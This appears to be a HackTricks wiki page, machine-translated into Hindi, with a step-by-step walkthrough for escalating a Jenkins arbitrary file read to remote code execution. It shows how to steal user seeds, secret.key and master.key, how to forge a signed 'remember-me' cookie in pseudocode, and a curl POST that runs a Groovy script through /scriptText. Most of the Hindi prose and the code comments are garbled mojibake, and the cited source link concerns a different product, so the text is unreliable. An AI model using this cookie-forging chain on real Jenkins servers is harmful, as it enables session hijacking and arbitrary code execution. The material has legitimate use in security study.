# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ Jenkins рдореЗрдВ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (Local File Inclusion) рдХреА рдХрдордЬреЛрд░реА рдХреЛ RCE рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

рдпрд╣ рдПрдХ AI рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╕рдВрдХреНрд╖реЗрдк рд╣реИ рдЙрд╕ рднрд╛рдЧ рдХреА рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдордирдорд╛рдирд╛ рдХреБрдХреА рдХрд╛ рдирд┐рд░реНрдорд╛рдг RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдм рддрдХ рдХрд┐ рдореЗрд░реЗ рдкрд╛рд╕ рдЦреБрдж рдХрд╛ рд╕рдВрдХреНрд╖реЗрдк рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдордп рдирд╣реАрдВ рд╣реИ:

### Attack Prerequisites

* **Feature Requirement:** "Remember me" рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ)ред
* **Access Levels:** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ Overall/Read рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЪрд╛рд╣рд┐рдПред
* **Secret Access:** рдкреНрд░рдореБрдЦ рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ рдмрд╛рдЗрдирд░реА рдФрд░ рдкрд╛рдареНрдп рд╕рд╛рдордЧреНрд░реА рдкрдврд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ред

### Detailed Exploitation Process

#### Step 1: Data Collection

**User Information Retrieval**

* рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП `$JENKINS_HOME/users/*.xml` рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪреЗрдВ:
* **Username**
* **User seed**
* **Timestamp**
* **Password hash**

**Secret Key Extraction**

* рдХреБрдХреА рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ:
* **Secret Key:** `$JENKINS_HOME/secret.key`
* **Master Key:** `$JENKINS_HOME/secrets/master.key`
* **MAC Key File:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Step 2: Cookie Forging

**Token Preparation**

*   **Token Expiry Time рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // рд╡рд░реНрддрдорд╛рди рд╕рдордп рдореЗрдВ рдПрдХ рдШрдВрдЯрд╛ рдЬреЛрдбрд╝реЗрдВ
```
{% endcode %}
*   **Token рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░реЗрдВ:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Key Decryption**

*   **MAC Key File рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ:**

```javascript
key = toAes128Key(masterKey)  // рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЛ AES128 рдХреБрдВрдЬреА рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░реЗрдВ
decrypted = AES.decrypt(macFile, key)  // .mac рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Signature Computation**

*   **HMAC SHA256 рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ:**

```javascript
mac = HmacSHA256(token, macKey)  // рдЯреЛрдХрди рдФрд░ MAC рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HMAC рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ
tokenSignature = bytesToHexString(mac)  // MAC рдХреЛ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░реЗрдВ
```

**Cookie Encoding**

*   **рдЕрдВрддрд┐рдо рдХреБрдХреА рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // рдХреБрдХреА рдбреЗрдЯрд╛ рдХреЛ Base64 рдореЗрдВ рдПрдиреНрдХреЛрдб рдХрд░реЗрдВ
```
{% endcode %}

#### Step 3: Code Execution

**Session Authentication**

* **CSRF рдФрд░ рд╕рддреНрд░ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:**
* `/crumbIssuer/api/json` рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ рддрд╛рдХрд┐ `Jenkins-Crumb` рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ `JSESSIONID` рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╛рдж рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдХреБрдХреА рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**Command Execution Request**

*   **Groovy Script рдХреЗ рд╕рд╛рде POST рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд┐рд╕реНрдЯрдо-рд╕реНрддрд░реАрдп рдХрдорд╛рдВрдб рдпрд╛ Jenkins рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рднреАрддрд░ рдЕрдиреНрдп рд╕рдВрдЪрд╛рд▓рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг curl рдХрдорд╛рдВрдб рдпрд╣ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдЖрд╡рд╢реНрдпрдХ рд╣реЗрдбрд░ рдФрд░ рдХреБрдХреА рдХреЗ рд╕рд╛рде Jenkins рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ рдордирдорд╛рдирд╛ рдХреЛрдб рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
